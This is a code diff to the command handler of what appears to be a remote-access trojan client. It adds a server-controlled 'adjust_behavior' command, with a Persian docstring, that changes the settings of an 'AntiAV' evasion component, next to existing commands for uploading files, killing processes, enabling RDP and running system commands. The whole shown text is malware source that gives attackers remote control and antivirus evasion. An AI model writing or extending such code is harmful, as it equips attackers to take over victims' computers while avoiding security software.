@@ -32,7 +32,8 @@ class CommandHandler:
             'upload_file': CommandHandler.handle_upload_file,
             'end_task': CommandHandler.handle_end_task,
             'enable_rdp': CommandHandler.handle_enable_rdp,
-            'disable_rdp': CommandHandler.handle_disable_rdp
+            'disable_rdp': CommandHandler.handle_disable_rdp,
+            'adjust_behavior': CommandHandler.handle_adjust_behavior
         }
         
         handler = handlers.get(command_type)
@@ -85,6 +86,34 @@ class CommandHandler:
             if Config.DEBUG_MODE:
                 logging.error(f"Error terminating task {process_name}: {str(e)}")
             raise CommandError(f"Error terminating task {process_name}: {str(e)}")
+
+    @staticmethod
+    def handle_adjust_behavior(params):
+        """
+        تنظیم رفتار کلاینت بر اساس دستورات سرور
+        """
+        try:
+            behavior = params.get("behavior", {})
+            if not behavior:
+                if Config.DEBUG_MODE:
+                    logging.error("No behavior settings provided")
+                raise CommandError("No behavior settings provided")
+            
+            anti_av = AntiAV()
+            current_behavior = anti_av.adjust_behavior({"name": "manual"})
+            current_behavior.update(behavior)
+            
+            if Config.DEBUG_MODE:
+                logging.info(f"Behavior adjusted by server: {current_behavior}")
+            return {
+                "status": "success",
+                "message": "Behavior adjusted",
+                "new_behavior": current_behavior
+            }
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Adjust behavior error: {str(e)}")
+            raise CommandError(f"Adjust behavior error: {str(e)}")
 
     @staticmethod
     def handle_system_command(params):
